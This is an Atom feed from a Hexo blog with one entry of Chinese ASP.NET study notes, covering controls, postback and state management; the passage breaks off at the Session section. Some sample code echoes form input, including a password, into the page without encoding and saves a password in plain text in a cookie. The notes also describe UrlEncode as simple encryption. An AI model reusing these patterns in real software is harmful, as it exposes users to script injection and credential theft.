<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rex_Surprise</title>
  
  <subtitle>Welcome to rexSurprise!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://atc96.top/"/>
  <updated>2020-06-27T10:36:54.232Z</updated>
  <id>https://atc96.top/</id>
  
  <author>
    <name>Rex_Surprise</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ASP.NET知识点</title>
    <link href="https://atc96.top/ASP.NET_PPT/"/>
    <id>https://atc96.top/ASP.NET_PPT/</id>
    <published>2020-06-27T10:39:42.000Z</published>
    <updated>2020-06-27T10:36:54.232Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#aspnet知识点">ASP.NET知识点</a><ul><li><a href="#第一章-aspnet简介">第一章 ASP.NET简介</a></li><li><a href="#第二章-aspnet中的控件">第二章 ASP.NET中的控件</a><ul><li><a href="#1-控件分类">1. 控件分类</a></li><li><a href="#2-页面回发">2. 页面回发</a></li><li><a href="#3-常用控件">3. 常用控件</a><ul><li><a href="#1-label控件">1. <strong>Label控件</strong></a></li><li><a href="#2-textbox控件"><strong>2. TextBox控件</strong></a></li><li><a href="#3-image控件">3. <strong>Image控件</strong></a></li><li><a href="#4-hyperlink控件">4. <strong>HyperLink控件</strong></a></li><li><a href="#5-radiobutton控件">5. <strong>RadioButton控件</strong></a></li><li><a href="#6-checkbox控件">6. <strong>CheckBox控件</strong></a></li><li><a href="#7-列表控件">7. <strong>列表控件</strong></a></li><li><a href="#8-hiddenfield控件">8. <strong>HiddenField控件</strong></a></li></ul></li><li><a href="#4-服务器控件的客户端事件处理">4. 服务器控件的客户端事件处理</a></li><li><a href="#5-总结">5. 总结</a></li></ul></li><li><a href="#第三章-aspnet系统对象与状态管理">第三章 ASP.NET系统对象与状态管理</a><ul><li><a href="#1-系统对象的概念">1. <strong>系统对象的概念</strong></a><ul><li><a href="#1-page对象">1. Page对象</a></li><li><a href="#2-response对象">2. Response对象</a></li><li><a href="#3-server对象">3. Server对象</a></li><li><a href="#4-aspnet中的状态管理">4. ASP.NET中的状态管理</a></li><li><a href="#5-cookie对象">5. Cookie对象</a></li><li><a href="#6-session对象">6. Session对象</a></li><li><a href="#7-application对象">7. Application对象</a></li><li><a href="#8-状态管理技术的区别">8. 状态管理技术的区别</a></li></ul></li><li><a href="#2-总结">2. 总结</a></li></ul></li><li><a href="#第四章-基于三层架构搭建系统">第四章 基于三层架构搭建系统</a><ul><li><a href="#1-为什么需要分层架构">1. <strong>为什么需要分层架构</strong></a></li><li><a href="#2-三层结构的优势">2. 三层结构的优势</a></li><li><a href="#3-模型层">3. 模型层</a><ul><li><a href="#3-1-创建模型层">3-1 创建模型层</a></li></ul></li><li><a href="#4-数据访问层">4. 数据访问层</a><ul><li><a href="#4-1-创建数据访问层">4-1 创建数据访问层</a></li><li><a href="#4-2-添加依赖">4-2 添加依赖</a></li></ul></li><li><a href="#5-业务逻辑层">5. 业务逻辑层</a><ul><li><a href="#5-1-创建业务逻辑层">5-1 创建业务逻辑层</a></li><li><a href="#5-2-添加依赖">5-2 添加依赖</a></li></ul></li><li><a href="#6-表示层">6. 表示层</a><ul><li><a href="#6-1-创建表示层">6-1 创建表示层</a></li><li><a href="#6-2-添加依赖">6-2 添加依赖</a></li></ul></li><li><a href="#7-目录结构">7. 目录结构</a></li><li><a href="#8-总结">8. 总结</a></li></ul></li><li><a href="#第五章-搭建风格统一的web站点">第五章 搭建风格统一的Web站点</a><ul><li><a href="#1-母版页">1. 母版页</a></li><li><a href="#2-母版页的优点">2. 母版页的优点</a></li><li><a href="#3-创建母版页">3. 创建母版页</a><ul><li><a href="#3-1-母版页的源文件">3-1 母版页的源文件</a></li><li><a href="#3-2-普通页面与母版页的区别">3-2 普通页面与母版页的区别</a></li></ul></li><li><a href="#4-创建内容页">4. 创建内容页</a><ul><li><a href="#4-1-新创建的内容页代码">4-1 新创建的内容页代码</a></li><li><a href="#4-2-将现有页面改为内容页">4-2 将现有页面改为内容页</a></li></ul></li><li><a href="#5-站点地图">5. 站点地图</a></li><li><a href="#6-treeview控件">6. TreeView控件</a></li><li><a href="#7-sitemappath">7. SiteMapPath</a></li><li><a href="#8-总结">8. <strong>总结</strong></a></li></ul></li><li><a href="#第六章-验证控件和上传控件">第六章 验证控件和上传控件</a><ul><li><a href="#1-数据验证控件">1. 数据验证控件</a><ul><li><a href="#1-requiredfieldvalidator">1. <strong>RequiredFieldValidator</strong></a></li><li><a href="#2-rangevalidator">2. <strong>RangeValidator</strong></a></li><li><a href="#3-comparevalidator">3. <strong>CompareValidator</strong></a></li><li><a href="#4-regularexpressionvalidator">4. <strong>RegularExpressionValidator</strong></a></li><li><a href="#5-customvalidator">5. <strong>CustomValidator</strong></a></li><li><a href="#6-validationsummary">6. <strong>ValidationSummary</strong></a></li><li><a href="#7-pageisvalid">7. <strong>Page.IsValid</strong></a></li><li><a href="#8-禁用验证">8. <strong>禁用验证</strong></a></li><li><a href="#9-文件上传控件">9. <strong>文件上传控件</strong></a></li></ul></li><li><a href="#2-总结-1">2. 总结</a></li></ul></li><li><a href="#第七章-数据绑定和gridview控件">第七章-数据绑定和GridView控件</a><ul><li><a href="#1-数据绑定">1. 数据绑定</a><ul><li><a href="#1-1-数据绑定机制">1-1 数据绑定机制</a></li><li><a href="#1-2-数据绑定表达式语法">1-2 数据绑定表达式语法</a></li></ul></li><li><a href="#2-gridview控件">2. GridView控件</a><ul><li><a href="#2-1-使用gridview控件呈现数据">2-1 使用GridView控件呈现数据</a></li><li><a href="#2-2-手动创建gridview列">2-2 手动创建GridView列</a></li><li><a href="#2-3-boundfield">2-3. BoundField</a></li><li><a href="#2-4-imagefield">2-4 ImageField</a></li><li><a href="#2-5-templatefield">2-5 TemplateField</a></li><li><a href="#2-6-commandfield">2-6 CommandField</a></li><li><a href="#2-7-hyperlinkfield">2-7 HyperLinkField</a></li><li><a href="#2-8-gridview的分页">2-8 GridView的分页</a></li><li><a href="#2-9-设置gridview的样式">2-9 设置GridView的样式</a></li></ul></li><li><a href="#3-总结">3. <strong>总结</strong></a></li></ul></li><li><a href="#第八章-gridview控件的使用二">第八章 GridView控件的使用（二）</a><ul><li><a href="#1-gridview控件的编辑功能">1. GridView控件的编辑功能</a></li><li><a href="#2-高亮显示鼠标悬浮的行数据">2. 高亮显示鼠标悬浮的行数据</a></li><li><a href="#3-detailsview控件">3. DetailsView控件</a></li><li><a href="#总结">总结</a></li></ul></li><li><a href="#第九章-使用datalist和repeater绑定数据">第九章 使用DataList和Repeater绑定数据</a><ul><li><a href="#1-datalist控件的使用">1. DataList控件的使用</a></li><li><a href="#2-datalist控件的重要属性">2. DataList控件的重要属性</a></li><li><a href="#3-实现datalist控件的分页">3. 实现DataList控件的分页</a></li><li><a href="#4-repeater控件的使用">4. Repeater控件的使用</a></li><li><a href="#总结-1">总结</a></li></ul></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="aspnet知识点">ASP.NET知识点</span></h1><h2><span id="第一章-aspnet简介">第一章 ASP.NET简介</span></h2><ul><li>ASP.NET有两种编码方式: 代码内嵌和代码后置 <ul><li><strong><em>代码内嵌</em></strong></li><li><img data-src="../images/mdImages/image-20200605145033897.png" alt="image-20200605145033897"></li><li><strong><em>代码后置</em></strong></li><li><img data-src="../images/mdImages/image-20200605144902385.png" alt="image-20200605144902385"></li></ul></li></ul><h2><span id="第二章-aspnet中的控件">第二章  ASP.NET中的控件</span></h2><h3><span id="1-控件分类">1. 控件分类</span></h3><ol><li><strong>HTML控件</strong><ul><li>比如<code>&lt;input type=&quot;text&quot; /&gt;</code>是一个文本框标签，在ASP.NET中，这种标签称作HTML控件。</li><li>在客户端使用JavaScript脚本语言进行控制。</li><li>HTML控件不消耗服务器资源，如果仅仅强调客户端的应用，那么用HTML控件即可。</li></ul></li><li><strong>HTML服务器控件</strong><ul><li>通过在HTML标签中添加“runat=”server””属性，将HTML控件转换为HTML服务器控件</li><li>在ASP.NET执行的过程中，ASP.NET将创建包含“runat=”server””属性的元素实例，如果需要在后置代码中使用此实例，则需要为控件分配id属性。</li><li><img data-src="../images/mdImages/image-20200605145844340.png" alt="image-20200605145844340"></li></ul></li><li><strong>Web服务器控件</strong><ul><li>微软重新定义的一套控件。</li><li>Web服务器控件提供统一的编程模型、包含方法以及与之相关的事件处理程序，并且这些代码都在服务器端执行。</li><li>Web服务器控件的标签都是以“asp:”开头，称为标记前缀，后面是控件类型。</li><li><img data-src="../images/mdImages/image-20200605145933161.png" alt="image-20200605145933161"></li></ul></li><li><strong>服务器控件</strong><pre><code>- HTML服务器控件和Web服务器控件都是在服务器端运行，它们通过设置id属性，在服务器端用id来自动捕获它们。- HTML服务器控件和Web服务器控件对应着类不同，如Button，所以HTML服务器控件和Web服务器控件的属性、方法及事件并不相同- ![image-20200605150113960](../images/mdImages/image-20200605150113960.png)</code></pre></li></ol><ul><li><em>不管什么控件，最终会生成HTML代码，由浏览器根据HTML代码解析后呈现</em></li></ul><h3><span id="2-页面回发">2. 页面回发</span></h3><ul><li>单击服务器控件Button时，引起了页面的回发。回发会触发Page_Load事件与按钮单击等事件。</li><li>页面回发的本质是提交表单。</li></ul><h3><span id="3-常用控件">3. 常用控件</span></h3><h4><span id="1-label控件">1. <strong>Label控件</strong></span></h4><ul><li><p>Label控件是ASP.NET中最常用的控件之一，用于将文本内容显示在网页上，支持以编程方式动态修改显示的内容。</p></li><li><table><thead><tr><th align="left">成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td align="left">Text</td><td>属性</td><td>获取或者设置控件的文本内容</td></tr><tr><td align="left">AccessKey</td><td>属性</td><td>导航到其他控件的快捷键</td></tr><tr><td align="left">AssociatedControlID</td><td>属性</td><td>使用快捷键导航的目的控件ID</td></tr><tr><td align="left">Visible</td><td>属性</td><td>布尔值，设置控件是否可见</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605150645780.png" alt="image-20200605150645780"></p></li></ul><h4><span id="2-textbox控件"><strong>2. TextBox控件</strong></span></h4><ul><li><p>使用TextBox控件收集用户输入的信息或者显示文本。它可以配置为单行、多行或者密码类型。</p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>AutoPostBack</td><td>属性</td><td>布尔值，规定当内容改变时，是否回传到服务器。默认是 false</td></tr><tr><td>Text</td><td>属性</td><td>获取或者设置控件的文本内容</td></tr><tr><td>TextMode</td><td>属性</td><td>设置  TextBox的模式（单行、多行或密码等）</td></tr><tr><td>ReadOnly</td><td>属性</td><td>布尔值，设置能否改变文本框中的文本</td></tr><tr><td>MaxLength</td><td>属性</td><td>在 TextBox 中所允许的最大字符数</td></tr><tr><td>Rows</td><td>属性</td><td>设置TextBox 的高度（仅在 TextMode=”Multiline” 时使用）</td></tr><tr><td>Columns</td><td>属性</td><td>设置TextBox 的宽度</td></tr><tr><td>OnTextChanged</td><td>事件</td><td>当 TextBox 中的文本被更改时所触发的事件</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605150756891.png" alt="image-20200605150756891"></p></li></ul><h4><span id="3-image控件">3. <strong>Image控件</strong></span></h4><ul><li><p>Image控件用于在网页上呈现图片，最终生成<img>元素，支持以编程的方式管理显示的图片。</p></li><li><table><thead><tr><th>成员名称</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>ImageUrl</td><td>属性</td><td>显示的图片所在的URL地址</td></tr><tr><td>ToolTip</td><td>属性</td><td>当鼠标指向图片时的说明性文字</td></tr><tr><td>AlternateText</td><td>属性</td><td>图像不可用时取代图像显示的文字</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605150907140.png" alt="image-20200605150907140"></p></li></ul><h4><span id="4-hyperlink控件">4. <strong>HyperLink控件</strong></span></h4><ul><li><p>HyperLink控件用于在网页上以图片或文本方式呈现一个链接。</p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>Text</td><td>属性</td><td>显示链接的文本</td></tr><tr><td>ImageUrl</td><td>属性</td><td>显示链接的图片所在的URL地址</td></tr><tr><td>NavigateUrl</td><td>属性</td><td>链接的目的页面的URL地址</td></tr><tr><td>ToolTip</td><td>属性</td><td>当鼠标指向链接时的说明性文字</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605151016530.png" alt="image-20200605151016530"></p></li></ul><h4><span id="5-radiobutton控件">5. <strong>RadioButton控件</strong></span></h4><ul><li><p>RadioButton控件用于在页面创建一个单选项，可以将多个单选项分为一组来创建多个互斥的选项。</p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>Text</td><td>属性</td><td>获取或者设置单选按钮的文本</td></tr><tr><td>TextAlign</td><td>属性</td><td>设置文本和单选按钮的对齐方式</td></tr><tr><td>GroupName</td><td>属性</td><td>分组的名称</td></tr><tr><td>Checked</td><td>属性</td><td>获取或者设置是否选中控件</td></tr><tr><td>OnCheckedChanged</td><td>事件</td><td>选择状态改变时触发</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605151108803.png" alt="image-20200605151108803"></p></li></ul><h4><span id="6-checkbox控件">6. <strong>CheckBox控件</strong></span></h4><ul><li><p>CheckBox控件用来在页面中创建复选框。</p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>Text</td><td>属性</td><td>获取或者设置单选按钮的文本</td></tr><tr><td>TextAlign</td><td>属性</td><td>设置文本和单选按钮的对齐方式</td></tr><tr><td>Checked</td><td>属性</td><td>获取或者设置是否选中控件</td></tr><tr><td>OnCheckedChanged</td><td>事件</td><td>选择状态改变时触发</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605151209330.png" alt="image-20200605151209330"></p></li></ul><h4><span id="7-列表控件">7. <strong>列表控件</strong></span></h4><ul><li><p>列表控件主要用于显示若干个选项，让用户选择其中一项或多项，具体过程取决于列表控件允许单选还是多项。</p></li><li><table><thead><tr><th>成员名称</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>AutoPostBack</td><td>属性</td><td>获取或设置一个值，当更改选项时，是否自动产生向服务器的回发</td></tr><tr><td>Items</td><td>属性</td><td>获取控件列表项的集合</td></tr><tr><td>SelectedValue</td><td>属性</td><td>获取列表控件中选定项的值或设置列表控件中包含指定值的项</td></tr><tr><td>Text</td><td>属性</td><td>获取或设置控件的SelectedValue属性</td></tr><tr><td>SelectedItem</td><td>属性</td><td>获取列表控件中索引最小的选定项</td></tr><tr><td>SelectedIndex</td><td>属性</td><td>获取或设置控件中选定项的最低序号索引</td></tr><tr><td>DataSource</td><td>属性</td><td>获取或设置对象，列表控件从该对象中检索其数据项列表</td></tr><tr><td>DataTextField</td><td>属性</td><td>获取或设置为列表项提供文本内容的数据源字段</td></tr><tr><td>DataValueField</td><td>属性</td><td>获取或设置为列表项提供值的数据源字段</td></tr><tr><td>DataBind</td><td>方法</td><td>将数据源绑定到控件及其所有子控件中</td></tr></tbody></table></li><li><p>在ASP.NET中，列表控件包括<strong><em>DropDownList控件</em></strong>、<strong><em>ListBox控件</em></strong>、<strong><em>RadioButtonList控件</em></strong>和<strong><em>CheckBoxList控件</em></strong>。</p></li><li><p><strong>RadioButtonList</strong>与<strong>CheckBoxList</strong>的常用成员如下所示。</p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>TextAlign</td><td>属性</td><td>文字与控件的对齐方式</td></tr><tr><td>RepeatDirection</td><td>属性</td><td>列表显示时排列的方向</td></tr><tr><td>RepeatColumns</td><td>属性</td><td>列表显示的列数</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605151415025.png" alt="image-20200605151415025"></p></li></ul><h4><span id="8-hiddenfield控件">8. <strong>HiddenField控件</strong></span></h4><ul><li>HiddenField控件是ASP.NET表单类控件，它没有用户界面，包含一个常用属性Value。</li><li>HiddenField控件会生成“type=’hidden’”的input元素</li><li>在实际项目中，为了避免页面回发时使数据恢复初始化的状态，可以使用HiddenField控件来保存这些数据。</li><li><img data-src="../images/mdImages/image-20200605151516095.png" alt="image-20200605151516095"></li></ul><h3><span id="4-服务器控件的客户端事件处理">4. 服务器控件的客户端事件处理</span></h3><ul><li>触发基于AutoPostback属性设置为true的服务器控件的事件会导致页面的回发，以便服务器端执行处理。</li><li>但回发会导致整个页面的频繁刷新，降低客户的体验度，也会增加服务器的负担，所以可以将一些工作借助客户端事件进行处理。</li><li>客户端事件在浏览器中引发后立即捕获，由浏览器中的javascript脚本负责处理；</li><li>在ASP.NET中，服务器控件借助Attributes属性来支持客户端的各种事件。</li><li>Attributes属性是在服务器端为服务器控件添加客户端处理代码的解决方案。</li><li><img data-src="../images/mdImages/image-20200605151723970.png" alt="image-20200605151723970"></li></ul><h3><span id="5-总结">5. 总结</span></h3><ul><li><p>在HTML标签中添加“runat=”server””的属性，把HTML控件转化为HTML服务器控件。</p></li><li><p>Web服务器控件不是由HTML元素直接转换而来的，而是微软重新定义的一套抽象控件。 </p></li><li><p>基本的Web服务器控件有Label、TextBox、Image、HyperLink、RadioButton、CheckBox、- DropDownList、ListBox、RadioButtonList、CheckBoxList、HiddenField等。</p></li><li><p>页面的回发会形成了一个新请求，服务器利用隐藏域保存服务器控件的状态和属性，在回传到服务器处理时，服务器又会将它们还原成控件的状态数据。</p></li><li><p>Attributes属性是在服务器端为服务器控件添加客户端处理代码的解决方案。</p></li></ul><h2><span id="第三章-aspnet系统对象与状态管理">第三章 ASP.NET系统对象与状态管理</span></h2><h3><span id="1-系统对象的概念">1. <strong>系统对象的概念</strong></span></h3><ul><li><p>在ASP.NET页面中包含一系列类，在页面中可以直接使用，我们称之为系统对象。</p></li><li><p>系统对象不需要编写代码进行初始化，其初始化时是在ASP.NET执行期间由系统完成的。</p></li><li><table><thead><tr><th>系统对象</th><th>类型</th></tr></thead><tbody><tr><td>Context</td><td>System.Web.HttpContext</td></tr><tr><td>Page</td><td>System.Web.UI.Page</td></tr><tr><td>Request</td><td>System.Web.HttpRequest</td></tr><tr><td>Response</td><td>System.Web.HttpResponse</td></tr><tr><td>Server</td><td>System.Web.HttpServerUtility</td></tr><tr><td>Application</td><td>System.Web.HttpApplicationState</td></tr><tr><td>Session</td><td>System.Web.SessionState.HttpSessionState</td></tr></tbody></table></li></ul><h4><span id="1-page对象">1. Page对象</span></h4><ul><li><p>ASP.NET页面继承System.Web.UI.Page类</p></li><li><p>每一个ASP.NET的页面对应一个页面类，所以每个ASP.NET页面在运行时就是一个Page对象。</p></li><li><p>用户访问页面时，ASP.NET会编译.aspx文件和.cs文件，合并生成页面类。</p></li><li><p><strong><em>@Page指令</em></strong></p><ul><li><p>aspx文件源视图，第一行代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot; AutoEventWireup&#x3D;&quot;true&quot; CodeFile&#x3D;&quot;Default.aspx.cs&quot; Inherits&#x3D;&quot;_Default&quot; </span><br><span class="line">&#x2F;&#x2F;Laguage：页面中代码的语言，必须是.NET Framework支持的语言。</span><br><span class="line">&#x2F;&#x2F;AutoEventWireup：设置页面是否自动调用网页事件，默认为true。</span><br><span class="line">&#x2F;&#x2F;CodeFile:指定代码后置的文件名，该后置代码与页面是局部关系。</span><br><span class="line">&#x2F;&#x2F;Inherits：用于指定后置代码中页面类的名称。</span><br><span class="line"> %&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><em>Page对象的常用成员</em></strong></p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>IsPostBack</td><td>属性</td><td>页面是否为回发状态</td></tr><tr><td>ClientScript</td><td>属性</td><td>管理客户端的脚本代码引入</td></tr><tr><td>Context</td><td>属性</td><td>Context系统对象的引用</td></tr><tr><td>Response</td><td>属性</td><td>Response系统对象的引用</td></tr><tr><td>Request</td><td>属性</td><td>Request系统对象的引用</td></tr><tr><td>Server</td><td>属性</td><td>Server系统对象的引用</td></tr><tr><td>Application</td><td>属性</td><td>Application系统对象的引用</td></tr><tr><td>Session</td><td>属性</td><td>Session系统对象的引用</td></tr><tr><td>FindControl</td><td>方法</td><td>查找指定名称的控件</td></tr><tr><td>Load</td><td>事件</td><td>在页面加载时触发</td></tr></tbody></table><ul><li>Page对象的IsPostBack属性<ul><li>IsPostBack属性用于区分页面是第一次加载还是因客户端回发而引起的加载。</li><li>当系统检测到页面处于回发状态时，会自动将IsPostBacks属性设为True。</li><li><img data-src="../images/mdImages/image-20200605152905903.png" alt="image-20200605152905903"></li><li><img data-src="../images/mdImages/image-20200605152919140.png" alt="image-20200605152919140"></li></ul></li></ul></li></ul><h4><span id="2-response对象">2. Response对象</span></h4><ul><li><p>Response对象提供对页面输出流的访问，用于ASP.NET的输出。</p></li><li><table><thead><tr><th>成员名称</th><th align="center">成员类型</th><th>说明</th></tr></thead><tbody><tr><td>Write</td><td align="center">方法</td><td>将指定的内容输出至页面</td></tr><tr><td>Redirect</td><td align="center">方法</td><td>将页面重定向到另一页面</td></tr><tr><td>ContentType</td><td align="center">属性</td><td>输出流的MIME类型，默认是  “text/html”</td></tr><tr><td>WriteFile</td><td align="center">方法</td><td>将指定的文件写入输出流</td></tr><tr><td>QueryString</td><td align="center">属性</td><td>HTTP协议GET请求发送的数据集合</td></tr><tr><td>Form</td><td align="center">属性</td><td>HTTP协议POST请求发送的数据集合</td></tr><tr><td>ServerVariables</td><td align="center">属性</td><td>本次请求的服务器端变量集合</td></tr><tr><td>Params</td><td align="center">属性</td><td>QueryString  Form  ServerVariables和Cookies项的组合集合该方法需要在最大的范围寻找匹配字段</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605153610264.png" alt="image-20200605153610264"></p></li><li><p><img data-src="../images/mdImages/image-20200605153622327.png" alt="image-20200605153622327"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!IsPostBack)</span><br><span class="line">        &#123;</span><br><span class="line">            string name &#x3D; Request.Form[&quot;txtName&quot;];</span><br><span class="line">            string pwd &#x3D; Request.Form[&quot;txtPwd&quot;];</span><br><span class="line">            string tel &#x3D; Request.Form[&quot;txtTelphone&quot;];</span><br><span class="line">            Response.Write(&quot;注册信息如下：&lt;br&#x2F;&gt;&quot;);</span><br><span class="line">            Response.Write(&quot;用户名：&quot; + name + &quot;&lt;br&#x2F;&gt;密码是：&quot; + pwd + &quot;&lt;br&#x2F;&gt;联系方式是：&quot; + tel);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="3-server对象">3. Server对象</span></h4><ul><li><p>Server对象封装了一些Web服务器相关的常用方法。</p></li><li><table><thead><tr><th>成员名称</th><th>说明</th></tr></thead><tbody><tr><td>UrlEncode</td><td>对URL地址进行编码，对于URL需要传输含有“#”、“&amp;”等特殊字符的参数时，需要进行编码，否则后面的内容不会被识别</td></tr><tr><td>UrlDecode</td><td>此方法与UrlEncode方法相反，对URL地址进行解码</td></tr><tr><td>HtmlEncode</td><td>编码字符串，使其在浏览器中的的显示与原字符串一致。如希望输出“&lt;br/&gt;”，又不想在浏览器中显示换行，则需要使用该方法</td></tr><tr><td>HtmlDecode</td><td>与HtmlEncode方法相反，对已编码内容解码</td></tr><tr><td>MapPath</td><td>方法的参数是虚拟路径，可返回该路径在物理磁盘中的准确位置。此方法在Web开发过程中使用频率比较高，一般实现文件读写都需要该方法</td></tr><tr><td>Execute</td><td>在当前页面执行参数指定的页面，执行完成后继续执行本页面</td></tr><tr><td>Transfer</td><td>参数指定的页面处理完成后，页面执行就结束，不像Execute那样还要返回控制权给先前的页面</td></tr></tbody></table></li><li><p><strong>UrlEncode</strong>与<strong>UrlDecode</strong>方法</p><ul><li><p>UrlEncode方法一般用于可能含有中文或特殊字符的环境中，有时也适用于对字符串进行简单加密。</p></li><li><p>调用UrlDecode方法，将编码进行解码操作，获得编码前的字符串。</p></li><li><p><img data-src="../images/mdImages/image-20200605153840432.png" alt="image-20200605153840432"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected void btnSearch_Click(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!string.IsNullOrEmpty(txtBook.Text))</span><br><span class="line">        &#123;</span><br><span class="line">            Response.Redirect(&quot;BookList.aspx?name&#x3D;&quot;         +Server.UrlEncode(txtBook.Text));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>HtmlEncode</strong>与<strong>HtmlDecode</strong>方法</p><ul><li>HtmlEncode主要应用于使一个字符串以原始方式呈现在页面中时，被浏览器识别为标签的字符转换为显示的字符。</li><li><img data-src="../images/mdImages/image-20200605153939031.png" alt="image-20200605153939031"></li></ul></li><li><p><strong>MapPath</strong>方法</p><ul><li><p>Server对象的MapPath方法用于根据网站的虚拟路径获取物理磁盘上的真实路径。</p></li><li><p><img data-src="../images/mdImages/image-20200605154019533.png" alt="image-20200605154019533"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">protected void btnSave_Click(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!string.IsNullOrEmpty(txtContent.Text))</span><br><span class="line">        &#123;</span><br><span class="line">            string filePath &#x3D; Server.MapPath(&quot;~&#x2F;info.txt&quot;);</span><br><span class="line">            FileStream fs &#x3D; new FileStream(filePath, FileMode.OpenOrCreate);</span><br><span class="line">            StreamWriter sw &#x3D; new StreamWriter(fs);</span><br><span class="line">            sw.Write(txtContent.Text);</span><br><span class="line">            sw.Close();</span><br><span class="line">            fs.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Execute</strong>和<strong>Transfer</strong>方法</p><ul><li><strong>Transfer</strong>用于终止当前页面程序的处理从而执行新的页面。</li><li><strong>Execute</strong>用于在当前请求上下文中执行一个新的页面。</li><li>Transfer会终止当前页面的处理，执行新页面的结果将替代当前页面；而<strong>Execute</strong>将执行一个新的页面，新页面的结果与当前页面的结果合并。</li><li><strong>Response.Redirect</strong>用于通知浏览器请求新页面，浏览器收到后会转向对新页面的请求，地址栏中显示新的请求地址。</li><li><strong>Transfer</strong>和<strong>Execute</strong>方法则是在当前请求中执行新页面，浏览器并不知情，地址栏中仍然显示原来请求的地址。</li><li><img data-src="../images/mdImages/image-20200605155023709.png" alt="image-20200605155023709"></li></ul></li></ul><h4><span id="4-aspnet中的状态管理">4. ASP.NET中的状态管理</span></h4><ul><li><strong>ASP.NET</strong>应用程序的访问是基于<strong>HTTP</strong>协议的，而<strong>HTTP</strong>协议在本质上是无状态的。</li><li>无状态的协议导致对页面的每个请求都视为新请求，来自一个请求的信息对下一个请求不可用。</li><li>为了解决无状态的问题，<strong>ASP.NET</strong>提供了大量的功能，用于在请求与请求之间、页面与页面之间甚至在整个应用程序内保留数据。</li><li>状态管理的技术包括隐藏域、<strong>Cookie</strong>、查询字符串、<strong>Application</strong>对象、<strong>Session</strong>对象等。</li></ul><h4><span id="5-cookie对象">5. Cookie对象</span></h4><ul><li><p><strong>Cookie</strong>是指小量信息，是服务器通知浏览器保存的一段文本信息，浏览器会将其保存在本地硬盘上。</p></li><li><p>对网站进行访问时，浏览器自动将从该网站保存下来的<strong>Cookies</strong>附加在请求中提交给服务器端。</p></li><li><p>每一个<strong>Cookie</strong>对象都保存在<strong>Cookies</strong>集合对象中，所以访问<strong>Cookie</strong>的方式如同访问集合中的元素。</p></li><li><p><img data-src="../images/mdImages/image-20200605155327316.png" alt="image-20200605155327316"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Response.Cookies[&quot;UserName&quot;].Value &#x3D; txtName.Text;</span><br><span class="line">Response.Cookies[&quot;UserName&quot;].Expires &#x3D; DateTime.Now.AddHours(2); </span><br><span class="line">Response.Cookies[&quot;UserPwd&quot;].Value &#x3D; txtPwd.Text;</span><br><span class="line">lblName.Text &#x3D; &quot;Cookies中保存的名称为UserName的Cookie值为：&quot; + Request.Cookies[&quot;UserName&quot;].Value;</span><br></pre></td></tr></table></figure></li><li><p>在客户端写入<strong>Cookies</strong>具有限制条件</p><ul><li>①大小限制。</li><li>①客户端可能关闭Cookie 。</li></ul></li></ul><h4><span id="6-session对象">6. 